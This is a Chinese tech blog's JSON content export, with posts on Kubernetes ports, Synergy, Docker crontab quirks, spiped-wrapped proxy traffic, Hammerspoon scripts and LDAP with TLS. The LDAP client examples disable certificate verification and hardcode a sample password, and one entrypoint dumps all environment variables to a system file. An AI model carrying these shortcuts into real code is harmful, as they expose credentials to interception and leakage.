{"meta":{"title":"闲谈","subtitle":null,"description":null,"author":"ushell","url":"https://ushell.me","root":"/"},"pages":[{"title":"about","date":"2020-12-14T05:59:36.000Z","updated":"2020-12-14T05:59:36.000Z","comments":true,"path":"about/index.html","permalink":"https://ushell.me/about/index.html","excerpt":"","text":""}],"posts":[{"title":"k8s容器参数containerPort解析","slug":"k8s容器参数containerPort解析","date":"2021-03-31T15:33:22.000Z","updated":"2021-03-31T15:33:22.000Z","comments":true,"path":"2021/03/31/k8s容器参数containerPort解析/","link":"","permalink":"https://ushell.me/2021/03/31/k8s%E5%AE%B9%E5%99%A8%E5%8F%82%E6%95%B0containerPort%E8%A7%A3%E6%9E%90/","excerpt":"","text":"0x1、背景在梳理线上业务过程发现，Pod的配置文件中containerPort参数配置错误也能正常通信；在接触k8s时间里一直以为containerPort参数必须设置才能使容器内服务被外部访问，通过一系列实验发现containerPort这个参数有些鸡肋。 官方解释containerPort参数: 12345List of ports to expose from the container. Exposing a port here gives the system additional information about the network connections a container uses, but is primarily informational.Not specifying a port here DOES NOT prevent that port from being exposed.Any port which is listening on the default &quot;0.0.0.0&quot; address inside a container will be accessible from the network. Cannot be updated. 根据文档描述可以看出containerPort参数是用来暴露容器端口服务，但后面描述凡是监听0.0.0.0地址的端口都可以被访问即使没有设置containerPort参数 0x2、验证为了验证文档的正确性，通过配置k8s的v1.20版本环境测试一下；这里采用redis设计实验场景 场景一 配置redis server的监听地址为0.0.0.0 Pod文件不使用containerPort参数 redis-server配置： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546apiVersion: v1kind: Servicemetadata: name: redisspec: ports: - name: tcp port: 6379 selector: component: redis-server type: ClusterIP---apiVersion: v1data: redis.conf: | bind 0.0.0.0 port 6379kind: ConfigMapmetadata: name: redis---apiVersion: apps/v1kind: Deploymentmetadata: name: &amp;name redis-serverspec: replicas: 1 selector: matchLabels: component: *name template: metadata: labels: component: *name spec: containers: - command: [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;redis-server /conf/redis.conf&#x27;] image: redis:6.0 name: *name volumeMounts: - mountPath: /conf name: config volumes: - name: config configMap: name: redis 场景二 配置redis server的监听地址为127.0.0.1 Pod文件使用containerPort参数 根据实验操作结果，场景一是可以被访问，验证了文档中描述监听0.0.0.0模式下不受containerPort配置限制; 场景二中是不能被访问，即使配置了containerPort参数。 通过上述简单实验验证，containerPort功能在实际业务中比较鸡肋；k8s网络组件比较复杂，后续补上相关逻辑实现部分… 0x3、参考 container官方API文档 kubernetes Port介绍","categories":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://ushell.me/categories/kubernetes/"}],"tags":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://ushell.me/tags/kubernetes/"}]},{"title":"synergy多主机共享键鼠","slug":"synergy多主机共享键鼠","date":"2021-01-17T07:36:12.000Z","updated":"2021-01-17T07:36:12.000Z","comments":true,"path":"2021/01/17/synergy多主机共享键鼠/","link":"","permalink":"https://ushell.me/2021/01/17/synergy%E5%A4%9A%E4%B8%BB%E6%9C%BA%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/","excerpt":"","text":"背景家里有台破旧的笔记本，为了让它继续发光发热，打算安装Debian系统配置开发环境；十年前的笔记本改装后依然可以开发诸如PHP或python之类不需要编译的项目。笔者的工作本是mbp, 两台笔记本开发时总是来回切换鼠标键盘比较麻烦，因此需要通过mbp操作旧版笔记本。 synergy是一个跨平台软件，可以通过一套键鼠操作多个不同系统主机的软件；同类型的还有微软推出的无界软件，不过该软件仅限Windows平台操作。 synergy分为收费版和开源版本，开源版本是命令行操作（无GUI），满足基本操作。 构建 下载源码 12345git clone https://github.com/symless/synergy-core.gitcd synergy-coregit checkout v2.0.0-stable 配置编译(MacOS) 123456789101112131415161718192021// 依赖qt, 如果没有安装可以brew install qt// 查看qt安装目录brew info qt // 设置Cmake环境变量export CMAKE_PREFIX_PATH=&quot;/usr/local/Cellar/qt/5.15.0/Frameworks/&quot;// 设置构建make文件目录mkdir build &amp;&amp; cd build// 注意big sur版本的sdk版本是11.0.sdkcmake -DCMAKE_OSX_SYSROOT=/Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX11.0.sdk -DCMAKE_OSX_DEPLOYMENT_TARGET=11.0 -DCMAKE_OSX_ARCHITECTURES=x86_64 ..// 编译make// make成功后生成三个二进制文件，其中synergy-core是核心文件，其他两个是旧版本程序synergy-core synergycsynergys 配置编译(Debian) 12345678git clone https://github.com/symless/synergy-core.gitcd synergy-coregit checkout v2.0.0-stablemkdir build// Debian8版本的cmake需要升级cmake ..make synergy配置示例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// server.conf// 配置参考: https://github.com/symless/synergy-core/wiki/Text-Config# sample synergy configuration file## comments begin with the # character and continue to the end of# line. comments may appear anywhere the syntax permits.# +----------+ +---------+ +---------+# | mac-mini | | macbook | | windows |# | | | | | |# +----------+ +---------+ +---------+section: screens # three hosts named: mac-mini, macbook, and windows # These are the nice names of the hosts to make it easy to write the config file # The aliases section below contain the &quot;actual&quot; names of the hosts (their hostnames) debian: macbook: windows:endsection: links # windows is to the right of macbook # mac-mini is to the left of macbook macbook: right(0,100) = windows # the numbers in parentheses indicate the percentage of the screen&#x27;s edge to be considered active for switching) left = debian # shift = shift (shift, alt, super, meta can be mapped to any of the others) # macbook is to the right of mac-mini debian: right = macbook # macbook is to the left of windows windows: left = macbookendsection: aliases # The &quot;real&quot; name of windows is John-Smiths-windows-3.local. # If we wanted we could remove this alias and instead use John-Smiths-windows-3.local everywhere windows is above. # Hopefully it should be easy to see why using an alias is nicer macbook: mbp debian: debian.localendsection: options switchDelay = 400 # 鼠标滑到边缘时，提留多久才能切换屏幕 clipboardSharing = true # 共享剪切板end 运行笔者采用mbp作为服务端控制Debian系统操作，需要注意的是mac环境运行软件需要设置给iterm配置权限(iterm终端执行synergy) 未配置权限报错: 1error failed to create quartz event tap mac环境权限配置: 系统偏好设置 -&gt; 安全性与隐私 -&gt; 辅助功能 -&gt; iterm.app允许 服务端(mbp)12// address参数代表服务端主机IP地址sudo ./synergy-core --server --address 192.168.1.100 --no-daemon --name macbook --config ./server.conf 客户端(Debian)1sudo ./synergy-core --client --no-daemon --name debian 192.168.1.100 操作操作mbp的触摸板移动到屏幕外时会进入到Debian系统屏幕中，同一局域网中操作流畅，没有卡顿现象。 如果Debian为server端操作mbp时会导致鼠标移动到mbp屏幕时点击无效情况。 参考1、[Synergy-core编译使用教程] https://segmentfault.com/a/1190000023512582 2、[synergy文档] https://github.com/symless/synergy-core/wiki/Compiling 3、[cmake官网] https://cmake.org/download/","categories":[{"name":"tools","slug":"tools","permalink":"https://ushell.me/categories/tools/"}],"tags":[{"name":"synergy","slug":"synergy","permalink":"https://ushell.me/tags/synergy/"},{"name":"共享键鼠","slug":"共享键鼠","permalink":"https://ushell.me/tags/%E5%85%B1%E4%BA%AB%E9%94%AE%E9%BC%A0/"}]},{"title":"Docker环境之Crontab踩坑","slug":"Docker环境之Crontab踩坑","date":"2020-03-24T16:00:00.000Z","updated":"2020-03-24T16:00:00.000Z","comments":true,"path":"2020/03/25/Docker环境之Crontab踩坑/","link":"","permalink":"https://ushell.me/2020/03/25/Docker%E7%8E%AF%E5%A2%83%E4%B9%8BCrontab%E8%B8%A9%E5%9D%91/","excerpt":"","text":"0x1.背景业务中遇到Python镜像使用crontab执行任务不执行的情况，通过一系列定位分析后发现crontab在处理环境变量和crontab任务文件解析存在问题。 环境 镜像: Python:3.7.5 Crontab版本: 3.0pl1-127+deb8u2 crontab任务文件 1* * * * * /usr/local/bin/python job.py &gt;&gt; /tmp/job.log 2&gt;&amp;1 0x2.环境变量python程序执行时采用os.environ读取环境变量，在调试程序时发现docker镜像打包运行后，程序报错无法读取环境变量值。登陆到k8s环境中手动执行env命令发现是可以获取注入的环境变量，修改python文件打印env环境信息 1environ(&#123;&#x27;HOME&#x27;: &#x27;/root&#x27;, &#x27;LOGNAME&#x27;: &#x27;root&#x27;, &#x27;PATH&#x27;: &#x27;/usr/bin:/bin&#x27;, &#x27;SHELL&#x27;: &#x27;/bin/sh&#x27;, &#x27;PWD&#x27;: &#x27;/root&#x27;, &#x27;LC_CTYPE&#x27;: &#x27;C.UTF-8&#x27;&#125;) 上述环境是基础的环境变量信息，python程序无法在执行环境获取新增的环境变量。在查找资料过程中发现crontab守护进程会从/etc/environment和/etc/default/locale获取环境变量。在Debian环境中采用service的方式运行/usr/sbin/cron, 定位对应的执行脚本 12345678910111213141516171819202122232425262728293031#cat /etc/init.d/cron...parse_environment ()&#123; for ENV_FILE in /etc/environment /etc/default/locale; do [ -r &quot;$ENV_FILE&quot; ] || continue [ -s &quot;$ENV_FILE&quot; ] || continue for var in LANG LANGUAGE LC_ALL LC_CTYPE; do value=`egrep &quot;^$&#123;var&#125;=&quot; &quot;$ENV_FILE&quot; | tail -n1 | cut -d= -f2` [ -n &quot;$value&quot; ] &amp;&amp; eval export $var=$value if [ -n &quot;$value&quot; ] &amp;&amp; [ &quot;$ENV_FILE&quot; = /etc/environment ]; then log_warning_msg &quot;/etc/environment has been deprecated for locale information; use /etc/default/locale for $var=$value instead&quot; fi done done# Get the timezone set. if [ -z &quot;$TZ&quot; -a -e /etc/timezone ]; then TZ=`cat /etc/timezone` fi&#125;# Parse the system&#x27;s environmentif [ &quot;$READ_ENV&quot; = &quot;yes&quot; ] ; then parse_environmentfi... shell脚本采用加载environment和locale文件将环境变量注入到当前进程环境中，根据crontab在bug#543895描述推荐使用locale文件。 经过上述分析，需要调整Dockerfile相关文件操作；这里采用entrypoint.sh文件注入环境变量 1env &gt;&gt; /etc/default/locale 0x3.任务解析与权限crontab任务创建有两种方式，一种是直接使用crontab命令手动编辑写入，另一种是将写好的任务文件复制到/var/spool/cron/crontabs目录中。 排查某个业务问题时，发现crontab任务不能执行（采用文件复制形式）；进入POD容器中使用cat命令查看任务文件也是显示正常，但是任务还是不能执行。后来通过crontab查看保存后，任务能正常执行。 回溯两次操作时，发现两个有意思的问题。问题一是crontab命令编辑任务文件保存后，该任务文件的组权限变成root:crontab(原root:root);问题二是crontab命令编辑查看文件后直接保存，文件大小发生改变，此过程无人为更改内容。 问题一的出现是因为crontab命令编辑文件时会设置任务文件的组，Debian镜像环境中只有root用户，用户组列表中是存在crontab组。由于Docker环境中只有root用户执行，不需要调整任务文件的权限；但非Docker环境中，crontab的任务文件一般设置600权限居多；cron守护进程读取文件时会校验权限。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#https://github.com/ushell/learncode/blob/master/crontab/debian/cron-3.0pl1/database.c#L206.../*任务文件权限校验*/if (strcmp(fname, &quot;*system*&quot;) &amp;&amp; !(pw = getpwnam(uname))) &#123;/* file doesn&#x27;t have a user in passwd file. */log_it(fname, getpid(), &quot;ORPHAN&quot;, &quot;no passwd entry&quot;);goto next_crontab;&#125;if ((crontab_fd = open(tabname, O_RDONLY, 0)) &lt; OK) &#123;/* crontab not accessible? */log_it(fname, getpid(), &quot;CAN&#x27;T OPEN&quot;, tabname);goto next_crontab;&#125;if (fstat(crontab_fd, statbuf) &lt; OK) &#123;log_it(fname, getpid(), &quot;FSTAT FAILED&quot;, tabname);goto next_crontab;&#125;/*查询/etc/passwd文件中用户*/u = find_user(old_db, fname);if (u != NULL) &#123; /* if crontab has not changed since we last read it * in, then we can just use our existing entry. */ if (u-&gt;mtime == statbuf-&gt;st_mtime) &#123; Debug(DLOAD, (&quot; [no change, using old data]&quot;)) unlink_user(old_db, u); link_user(new_db, u); goto next_crontab; &#125; /* before we fall through to the code that will reload * the user, let&#x27;s deallocate and unlink the user in * the old database. This is more a point of memory * efficiency than anything else, since all leftover * users will be deleted from the old database when * we finish with the crontab... */ Debug(DLOAD, (&quot; [delete old data]&quot;)) unlink_user(old_db, u); free_user(u); log_it(fname, getpid(), &quot;RELOAD&quot;, tabname);&#125;... 问题二的出现比较诡异，文件大小变化但cat查看文件内容没有明显变化。通过xxd命令查看文件改动前后的十六进制信息 crontab改动前 123400000000: 3020 3020 2a20 2a20 2a20 2f75 7372 2f6c 0 0 * * * /usr/l00000010: 6f63 616c 2f62 696e 2f70 7974 686f 6e20 ocal/bin/python//省略...000000f0: 2e6c 6f67 2032 3e26 31 .log 2&gt;&amp;1 crontab改动后 123400000000: 3020 3020 2a20 2a20 2a20 2f75 7372 2f6c 0 0 * * * /usr/l00000010: 6f63 616c 2f62 696e 2f70 7974 686f 6e20 ocal/bin/python//省略...000000f0: 2e6c 6f67 2032 3e26 310a .log 2&gt;&amp;1. 注意到文件结尾处的区别，改动后多了0x0a标志信息即文件换行符LF。由于任务文件最后一行没有换行符号导致不能加载该条命令。 12345678910111213141516171819202122232425262728//https://github.com/ushell/learncode/blob/master/crontab/debian/cron-3.0pl1/misc.c#L329/* get_string(str, max, file, termstr) : like fgets() but * (1) has terminator string which should include \\n * (2) will always leave room for the null * (3) uses get_char() so LineNumber will be accurate * (4) returns EOF or terminating character, whichever */intget_string(string, size, file, terms) char *string; int size; FILE *file; char *terms;&#123; int ch; while (EOF != (ch = get_char(file)) &amp;&amp; !strchr(terms, ch)) &#123; if (size &gt; 1) &#123; *string++ = (char) ch; size--; &#125; &#125; if (size &gt; 0) *string = &#x27;\\0&#x27;; return ch;&#125; 0x4.手工调试基于Debian系统的crontab没有日志记录，调试代码时需要打开 cron.h文件中DEBUGGING；重新编译后，crontab执行时会打印一些关键的DEBUG信息方便排查。 注意编译后参数-x的值问题 12#示例./cron -x ext,proc,pars,load #参考cron.h中的DebugFlags 0x5.总结crontab是Linux环境中最常用的定时任务执行程序，由于操作系统不同crontab的实现方式也不一样。在Docker环境中，基于Debian系统使用的是3.0pl1-127版本，Alpine系统中使用的busybox版本。前者程序比较完善但是不支持日志记录(需要修改源码), 后者比较轻量级支持前后台及日志记录等功能。 由于crontab最新一版的更新是2004年左右，Debian系统打算采用cronie代替目前crontab。业务系统中可以根据其他版本的定时程序代替。 参考 bug#543895 DebianCronWiki LocaleWiki crontab原理分析","categories":[{"name":"docker","slug":"docker","permalink":"https://ushell.me/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://ushell.me/tags/docker/"},{"name":"crontab","slug":"crontab","permalink":"https://ushell.me/tags/crontab/"},{"name":"debian","slug":"debian","permalink":"https://ushell.me/tags/debian/"}]},{"title":"PHP7.4的新功能FFI","slug":"php7-4的新功能FFI","date":"2019-12-10T16:00:00.000Z","updated":"2019-12-10T16:00:00.000Z","comments":true,"path":"2019/12/11/php7-4的新功能FFI/","link":"","permalink":"https://ushell.me/2019/12/11/php7-4%E7%9A%84%E6%96%B0%E5%8A%9F%E8%83%BDFFI/","excerpt":"","text":"PHP在7.4版本提供一个有意思的扩展FFI(Foreign Function Interface)，使PHP可以调用C语言的函数，该扩展由PHP核心开发者Dmitry Stogov开发。其实跨语言调用已经很常见的需求，虽然看着比较怪异，更多的是一种折中实现wrapper。FFI的出现降低对开发PHP扩展的依赖，在此之前如果调用某些C语言编写的库时，需要以开发PHP扩展形式进行封装；即使有zephir这样的工具，依然增加学习成本。 #示例#缺点#总结#参考 PHP 7.4 FFI: What you need to know PHP 7.4 前瞻：FFI PHP FFI官网文档 PHP FFI源码 PHP FFI RFC","categories":[{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"}],"tags":[{"name":"ffi","slug":"ffi","permalink":"https://ushell.me/tags/ffi/"}]},{"title":"SSR流量加密","slug":"SSR流量加密","date":"2019-09-23T16:00:00.000Z","updated":"2019-09-23T16:00:00.000Z","comments":true,"path":"2019/09/24/SSR流量加密/","link":"","permalink":"https://ushell.me/2019/09/24/SSR%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86/","excerpt":"","text":"酸酸乳流浪在外，总会有坏人在酸酸乳回家的路上时常打劫她。英勇的你应该如何保护你家可爱的酸酸乳呢？纵观魔法世界，无外乎加密或混淆。混淆算是道高一尺，魔高一丈；还是魔高一尺，道高一丈呢？真真假假倒不如挖条专门的路让酸酸乳可以愉快的玩耍，这里使用spiped方案来实现。 spiped是Tarsnap项目中的一个加密通信工具，另外还有著名的加密工具scrypt, 目前已开源到同人社区, 该工具使用AES加密通信，支持socket端口加密转发，类似SSH代理，工作原理参考官方文档 本文不讨论酸酸乳配置，只是讨论给酸酸乳套件衣服。 #spiped配置 下载源码 1git clone https://github.com/Tarsnap/spiped.git 依赖安装 123# OpenSSL依赖 (OSX系统)export LDFLAGS=&quot;-L /usr/local/Cellar/openssl/1.0.2r/lib&quot; CFLAGS=&quot;-I /usr/local/Cellar/openssl/1.0.2r/include&quot; 编译 1make spiped 12345# spipe测试工具spipe/spipe# spiped主程序 spiped/spiped #酸酸乳配置 流量流通示例 1本地请求流量 -&gt; 本地酸酸乳服务 -&gt; 本地spiped服务 &lt;-----&gt; 服务器spiped服务 -&gt; 服务器本地酸酸乳服务 -&gt; 外面的世界 spiped密钥生成 12# 复制该密钥到服务器上dd if=/dev/urandom bs=32 count=1 &gt; secret.key spiped客户端运行 1spiped -e -s &#x27;127.0.0.1:10086&#x27; -t 服务器IP:服务器端口 -k secret.key spiped服务端运行 1spiped -d -s &#x27;0.0.0.0:服务器端口&#x27; -t &#x27;127.0.0.1:酸酸乳端口&#x27; -k secret.key 配置本地酸酸乳端口 1服务器配置: 127.0.0.1 端口:10086 注意: 酸酸乳服务端尽量127运行，不要暴露到外面；spiped服务端口暴露的端口尽量是常用服务端口 缺点: 由于给酸酸乳套了层衣服，手机端是不能使用的！ 同类型的服务还有stunnel…","categories":[{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"}],"tags":[{"name":"ssr","slug":"ssr","permalink":"https://ushell.me/tags/ssr/"},{"name":"spipe","slug":"spipe","permalink":"https://ushell.me/tags/spipe/"}]},{"title":"hammerspoon提高生产力","slug":"hammerspoon提高生产力","date":"2019-09-07T16:00:00.000Z","updated":"2019-09-07T16:00:00.000Z","comments":true,"path":"2019/09/08/hammerspoon提高生产力/","link":"","permalink":"https://ushell.me/2019/09/08/hammerspoon%E6%8F%90%E9%AB%98%E7%94%9F%E4%BA%A7%E5%8A%9B/","excerpt":"","text":"hammerspoon是MacOS系统下一款实现自动化的工具，通过lua脚本扩展系统功能。相比其他通过python脚本，nodejs脚本或原生的automator, hammerspoon更加简单，提示框界面美观。也可以使用python和pync库实现监控通知，nodejs和node-notifier组件实现通知的方案。毕竟工具的自动化是提高生产力的必要因素。 #配置hammerspoon可以使用brew安装，也可以直接在官网下载二进制文件 12345#github下载页面https://github.com/Hammerspoon/hammerspoon/releases#brew安装brew install hammerspoon 安装完成后，在启动台中可以看到已安装的hammerspoon图标, MacOS的菜单栏上会显示一个锤子图标。 hammerspoon默认配置文件是~/.hammerspoon/init.lua 配置文件目录 123456.hammerspoon├── Spoons├── init.lua└── weather └── weather.lua #功能在hammerspoon文档中，支持运行应用、电池管理、window窗口管理、对话框、网络管理等等功能；其中hammerspoon提供了一个hs.http库用来实现http相关请求功能。 以天气功能为示例来了解hammerspoon使用 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960-- 编辑weather/weather.lua-- 天气接口使用tianqiapi免费接口, 需要简单注册获取ID及密码local urlApi = &#x27;https://www.tianqiapi.com/api/?version=v1&amp;appid=申请ID&amp;appsecret=申请密码&#x27;local menubar = hs.menubar.new()local menuData = &#123;&#125;-- 天气图标local weaEmoji = &#123; lei = &#x27;⛈&#x27;, qing = &#x27;☀️&#x27;, shachen = &#x27;😷&#x27;, wu = &#x27;🌫&#x27;, xue = &#x27;❄️&#x27;, yu = &#x27;🌧&#x27;, yujiaxue = &#x27;🌨&#x27;, yun = &#x27;☁️&#x27;, zhenyu = &#x27;🌧&#x27;, yin = &#x27;⛅️&#x27;, default = &#x27;&#x27;&#125;function updateMenubar() menubar:setTooltip(&quot;天气预报&quot;) menubar:setMenu(menuData)endfunction getWeather() -- 请求API接口 hs.http.doAsyncRequest(urlApi, &quot;GET&quot;, nil,nil, function(code, body, htable) if code ~= 200 then print(&#x27;get weather error:&#x27;..code) return end rawjson = hs.json.decode(body) city = rawjson.city menuData = &#123;&#125; -- 处理数据，更新到菜单栏里 for k, v in pairs(rawjson.data) do if k == 1 then menubar:setTitle(weaEmoji[v.wea_img]) titlestr = string.format(&quot;%s %s %s 🌡️%s 💧%s 💨%s 🌬 %s %s&quot;, city,weaEmoji[v.wea_img],v.day, v.tem, v.humidity, v.air, v.win_speed, v.wea) item = &#123; title = titlestr &#125; table.insert(menuData, item) table.insert(menuData, &#123;title = &#x27;-&#x27;&#125;) else -- titlestr = string.format(&quot;%s %s %s %s&quot;, v.day, v.wea, v.tem, v.win_speed) titlestr = string.format(&quot;%s %s %s 🌡️%s 🌬%s %s&quot;, city, weaEmoji[v.wea_img],v.day, v.tem, v.win_speed, v.wea) item = &#123; title = titlestr &#125; table.insert(menuData, item) end end updateMenubar() end)endmenubar:setTitle(&#x27;⌛&#x27;)getWeather()updateMenubar()-- 定时任务hs.timer.doEvery(3600, getWeather) 示例二：定时获取股票行情 1234567891011121314151617181920212223242526272829303132333435363738394041-- 相关代码已更新到Githublocal XQAPI = &quot;&quot;local menubar = hs.menubar.new()local menuData = &#123;&#125;local stockList = &#x27;SH000001&#x27;function updateMenubar() menubar:setMenu(menuData)endfunction getStock(fisrt) fisrt = fisrt or false -- 请求服务 api = string.format(&quot;%s/?symbol=%s&quot;, XQAPI, stockList) hs.http.doAsyncRequest(api, &quot;GET&quot;, nil, headers, function(code, body, htable) if code ~= 200 then print(&#x27;获取数据错误:&#x27;..code) return end menuData = &#123;&#125; rawjson = hs.json.decode(body) for k, v in pairs(rawjson.data) do -- 菜单样式 titles = string.format(&quot;🇨🇳%s ¥%s 🚀%s 👆%s 👇︎%s 🚗%s 💰%.3f/亿 🤝%s&quot;, v.symbol, v.current, v.percent..&#x27;%&#x27;, v.high, v.low, v.open, v.amount/100000000, v.turnover_rate..&#x27;%&#x27; ) table.insert(menuData, &#123;title = titles&#125;) end updateMenubar() end)endmenubar:setTitle(&#x27;🚨&#x27;)getStock(true)updateMenubar()hs.timer.doEvery(600, getStock) hammerspoon可以实现自动化功能还有很多，仅通过hs.http和 hs.timer功能就可以监控实时某些服务稳定性，怎么玩出花样还是依赖各位看官们的脑洞了 :) #参考hammerspoon官方文档hammerspoon awsome项目lua十分钟教程","categories":[{"name":"tools","slug":"tools","permalink":"https://ushell.me/categories/tools/"}],"tags":[{"name":"hammerspoon","slug":"hammerspoon","permalink":"https://ushell.me/tags/hammerspoon/"},{"name":"自动化","slug":"自动化","permalink":"https://ushell.me/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"}]},{"title":"LDAP配置TLS加密通信","slug":"LDAP配置TLS加密通信","date":"2019-08-26T16:00:00.000Z","updated":"2019-08-26T16:00:00.000Z","comments":true,"path":"2019/08/27/LDAP配置TLS加密通信/","link":"","permalink":"https://ushell.me/2019/08/27/LDAP%E9%85%8D%E7%BD%AETLS%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/","excerpt":"","text":"LDAP在企业开发中常用的一种协议，实现企业账户统一管理的方案。常用的LDAP开源方案主要是openldap, Debian系列和CentOS系统都会自带，但需要注意配置文件不同。在基于LDAP开发相关功能时，由于LDAP协议属于明文协议，业务对安全性要求较高的场合需要搭配TLS完成对数据加密传输。LDAP默认支持TLS协议，开放的端口是636。 0x1 基础配置openldap服务配置TLS: slapd手动运行 12#openldap v2.4.44版本自带TLS，无需配置, slapd需要指定 &quot;ldaps:///&quot;/usr/sbin/slapd -u ldap -h ldap:/// ldaps:/// service服务运行 (CentOS环境) 12#vim /etc/sysconfig/slapdservice slapd start 验证 123ps uax|grep slapdlsof -i:636 openldap docker服务配置(简易): 环境变量设置123456# 替换成自己的证书或使用自带证书LDAP_TLS: trueLDAP_TLS_CRT_FILENAME: ldap.crtLDAP_TLS_KEY_FILENAME: ldap.keyLDAP_TLS_DH_PARAM_FILENAME: dhparam.pemLDAP_TLS_CA_CRT_FILENAME: ca.crt 0x2 开发使用经过以上简单配置，ldap已经支持TLS传输数据了。开发语言中实现ldap客户端的方式不同，需要注意开发语言官方文档 PHP客户端 12345678# 系统需要安装cryus-sasl库yum install cyrus-sasl cyrus-sasl-devel cyrus-sasl-ldap# 安装ldap扩展(phpbrew示例)phpbrew ext install ldap -- --with-ldap=/usr/local/Cellar/openldap/2.4.47 --with-ldap-sasl=/usr/local/opt/cyrus-sasl# 查看配置信息 (注意`SASL Support`启用状态)php --ri ldap 123456789101112131415161718192021222324252627282930313233343536373839#本地代码运行环境配置ldap.conf (php的ldap依赖这个配置文件)echo &quot;TLS_REQCERT never&quot; &gt;&gt; /etc/openldap/ldap.conf# 示例代码一&lt;?php$host = &quot;127.0.0.1&quot;;$port = 389; #注意端口$username = &#x27;cn=username,ou=people,dc=test,dc=com&#x27;$password = &#x27;123456&#x27;$conn = ldap_connect($host, $port);#调试信息ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);ldap_set_option(NULL, LDAP_OPT_DEBUG_LEVEL, 7);# tls开启 (使用的是ldap_start_tls函数)ldap_start_tls($conn);# 认证$auth = ldap_bind($conn, $username, $password);echo $auth ? &quot;ok&quot; : &quot;fail&quot;;# 示例代码二 (不推荐)&lt;?php$host = &quot;ldaps://127.0.0.1&quot;; #必须带ldaps协议头部，标识开启TLS$port = 636;$username = &#x27;cn=username,ou=people,dc=test,dc=com&#x27;$password = &#x27;123456&#x27;$conn = ldap_connect($host, $port);#调试信息ldap_set_option($conn, LDAP_OPT_PROTOCOL_VERSION, 3);ldap_set_option(NULL, LDAP_OPT_DEBUG_LEVEL, 7);# 认证$auth = ldap_bind($conn, $username, $password);echo $auth ? &quot;ok&quot; : &quot;fail&quot;; Python客户端 12345678import ldapldap = &quot;ldap://127.0.0.1:389&quot;ldaps = &quot;ldaps://127.0.0.1:636&quot;ldapconn = ldap.initialize(ldaps)username = &#x27;cn=username,ou=people,dc=test,dc=com&#x27;password = &#x27;123456&#x27;ldapconn.simple_bind_s(username, password) Golang客户端 123456789101112//...省略l, err := Dial(&quot;tcp&quot;, fmt.Sprintf(&quot;%s:%d&quot;, &quot;ldap.example.com&quot;, 389))if err != nil &#123; log.Fatal(err)&#125;defer l.Close()// 注意InsecureSkipVerifyerr = l.StartTLS(&amp;tls.Config&#123;InsecureSkipVerify: true&#125;)if err != nil &#123; log.Fatal(err)&#125; 0x3 TLS分析上述的配置基本实现了ldap通信数据加密需求，如果留意代码中注释的话，会对文章开头TLS端口636与代码中实际使用却不同。这个需要指出的是客户端语言实现不同导致的。 以PHP语言为例分析LDAP扩展中实现通信逻辑: 使用636端口测试123# 使用文中的示例代码,端口修改成636输出结果`PHP Warning: ldap_start_tls(): Unable to start TLS: ` 关闭636端口测试1测试无影响，数据加密传输 在PHP文档ldap_start_tls函数评论中提到，ldaps和startTLS不是一回事，ldaps服务开放636端口，389端口支持加密和非加密数据传输; 并且ldaps不推荐使用。 PHP扩展ldap本质是调用openldap库中的函数实现，重点分析openldap中ldap_connect和ldap_start_tls两个函数实现。 笔者以openldap-2.4.47版本分析startTLS和ldaps实现及区别 openldap库目录结构: 12345678openldap-2.4.47 - libraries/libldap/* #PHP使用的ldap扩展底层依赖库 - init.c #初始化操作 - open.c. #连接操作 - tls2.c. #TLS相关 - options.c #配置相关 - url.c. #URL处理相关 - request.c #网络通信相关 ldap_connect函数主要实现功能 12345678//ldap初始化int ldap_initialize( LDAP **ldp, LDAP_CONST char *url )// 设置ldp参数，如果启用sasl相关则初始化sasl相关设置, 加载系统配置文件int ldap_create( LDAP **ldp )// 解析URL，设置连接信息int ldap_set_option(LDAP *ld, int option, LDAP_CONST void *invalue) ldap_start_tls函数主要实现功能 12345678910111213141516171819202122//ldap_start_tls函数调用底层ldap_start_tls_s函数int ldap_start_tls_s(LDAP *ld, LDAPControl **serverctrls, LDAPControl **clientctrls)&#123; //...省略 // 默认连接检查是否开启TLS if ( ldap_tls_inplace( ld ) ) &#123; return LDAP_LOCAL_ERROR; &#125; // 建立连接 rc = ldap_extended_operation_s( ld, LDAP_EXOP_START_TLS, NULL, serverctrls, clientctrls, &amp;rspoid, &amp;rspdata ); //...省略 if ( rc == LDAP_SUCCESS ) &#123; // 协商TLS通信会话 rc = ldap_int_tls_start( ld, ld-&gt;ld_defconn, NULL ); &#125; return rc; //...省略&#125; ldap使用流程对比: 12ldap_connect -&gt; ldap_bindldap_connect -&gt; ldap_start_tls -&gt; ldap_bind ldap_start_tls在bind认证前开启TLS验证，ldaps是在ldap_bind操作时再初始化TLS会话，身份认证操作。两种操作在底层实现相差不大，主要是服务端389端口支持加密和非加密两种功能。 slapd服务端连接判断 123456789101112131415161718192021222324252627282930313233Connection * connection_init( ber_socket_t s, Listener *listener, const char* dnsname, const char* peername, int flags, slap_ssf_t ssf, struct berval *authid LDAP_PF_LOCAL_SENDMSG_ARG(struct berval *peerbv))&#123; //...省略#ifdef HAVE_TLS // TLS连接判断 if ( flags &amp; CONN_IS_TLS ) &#123; c-&gt;c_is_tls = 1; c-&gt;c_needs_tls_accept = 1; &#125; else &#123; c-&gt;c_is_tls = 0; c-&gt;c_needs_tls_accept = 0; &#125;#endif slap_sasl_open( c, 0 ); slap_sasl_external( c, ssf, authid ); slapd_add_internal( s, 1 ); backend_connection_init(c); //...省略 有一点需要注意的是客户端使用ldap_start_tls函数时，会自动加载本地目录/etc/openldap/ldap.conf文件, 具体参考PHP测试说明。其中ldap.conf配置内容参考man ldap.conf命令说明及官方文档。 0x4 参考 openldap TLS文档 openldap docker php TLS使用 